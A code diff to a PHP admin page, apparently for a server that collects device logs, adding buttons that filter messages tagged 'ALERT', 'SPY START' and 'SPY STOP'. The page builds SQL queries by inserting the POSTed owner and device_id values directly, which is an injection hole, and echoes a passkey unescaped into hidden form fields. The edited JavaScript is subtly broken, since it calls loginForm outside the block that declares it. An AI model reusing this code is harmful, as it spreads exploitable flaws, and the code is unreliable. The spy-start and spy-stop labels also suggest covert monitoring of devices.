@@ -31,6 +31,12 @@
           echo"Wrong passkey : '$passkey' Please contact admin to resolve issue." ;
           return;
         };
+        
+        $signal = "";
+        if(isset($_POST['signal'])) {
+            $signal = $_POST ["signal"] ;
+        }
+        //echo "SIGNAL = $signal";
     ?>
 
     <?php
@@ -43,6 +49,10 @@
             $device_id = $_POST ["device_id"] ;
         }
         $sql = "SELECT * FROM `MESSAGE` ORDER BY id DESC";
+        if($signal=='1') $sql = "SELECT * FROM `MESSAGE` WHERE MESSAGE LIKE '%ALERT%' ORDER BY id DESC";
+        if($signal=='2') $sql = "SELECT * FROM `MESSAGE` WHERE MESSAGE LIKE '%SPY START%' ORDER BY id DESC";
+        if($signal=='3') $sql = "SELECT * FROM `MESSAGE` WHERE MESSAGE LIKE '%SPY STOP%' ORDER BY id DESC";
+        
         if(!(empty($owner) && empty($device_id))) {
             $sql = "SELECT * FROM `MESSAGE` where `OWNER`='$owner' and `DEVICE_ID`='$device_id' ORDER BY id DESC";
         } else {
@@ -58,6 +68,7 @@
                     </div>    
                     <div>
                         <form action="./delete.php" id="deleteForm" method="post" target="blank" >
+                            <input type="hidden" name="passkey" id="passkey" value="<?php echo $passkey ?>"> 
                             <input type="hidden" name="owner" id="owner" value="<?php echo $owner ?>"> 
                             <input type="hidden" name="device_id" id="device_id" value="<?php echo $device_id ?>">
                             <input type="button" value="Delete logs" onClick="javascript: deleteLogs()">
@@ -66,6 +77,8 @@
                 </div>
     <?php } else { ?>
             <form action="./display.php" id="loginForm" method="post" target="blank" >
+                <input type="hidden" name="passkey" id="passkey" value="<?php echo $passkey ?>">
+                <input type="hidden" name="signal" id="signal" value="<?php echo $signal ?>">
                 <input type="hidden" name="owner" id="owner" > 
                 <input type="hidden" name="device_id" id="device_id" >
                 <div style="display: grid; grid-template-columns: 1fr 1fr; grid-gap: 20px;">
@@ -84,7 +97,10 @@
                         </select>    
                     </div>
                     <div>
-                        <input type="button" value="Submit" onClick="javascript: displayLogs()">
+                        <input type="button" value="Logs" onClick="javascript: displayLogs(0)">
+                        <input type="button" value="Alert" onClick="javascript: displayLogs(1)">
+                        <input type="button" value="Start" onClick="javascript: displayLogs(2)">
+                        <input type="button" value="Stop" onClick="javascript: displayLogs(3)">
                     </div>
                 </div>
             </form>
@@ -99,22 +115,26 @@
     
 <script>
 
-    function displayLogs() {
-        //alert('inside');
-        let loginForm = document.getElementById("loginForm");
-        var devices = document.getElementById("alldevices");
-        var value = devices.value;
-        if(value=="0") {
-            alert("Please select device for which logs need to be filtered")
+    function displayLogs(signal) {
+        //alert(signal);
+        if(signal>0) {
+            document.getElementById("signal").value = signal;
         } else {
-            var text = devices.options[devices.selectedIndex].text;
-            //alert('value='+value+' text='+text);
-            const myArray = text.split("-");
-            document.getElementById("owner").value = myArray[0];
-            document.getElementById("device_id").value = myArray[1];
-            //alert('submitting...');
-            loginForm.submit();
+            let loginForm = document.getElementById("loginForm");
+            var devices = document.getElementById("alldevices");
+            var value = devices.value;
+            if(value=="0") {
+                alert("Please select device for which logs need to be filtered")
+            } else {
+                var text = devices.options[devices.selectedIndex].text;
+                //alert('value='+value+' text='+text);
+                const myArray = text.split("-");
+                document.getElementById("owner").value = myArray[0];
+                document.getElementById("device_id").value = myArray[1];
+            }
         }
+        //alert('submitting...');
+        loginForm.submit();
     }
     
     function deleteLogs() {
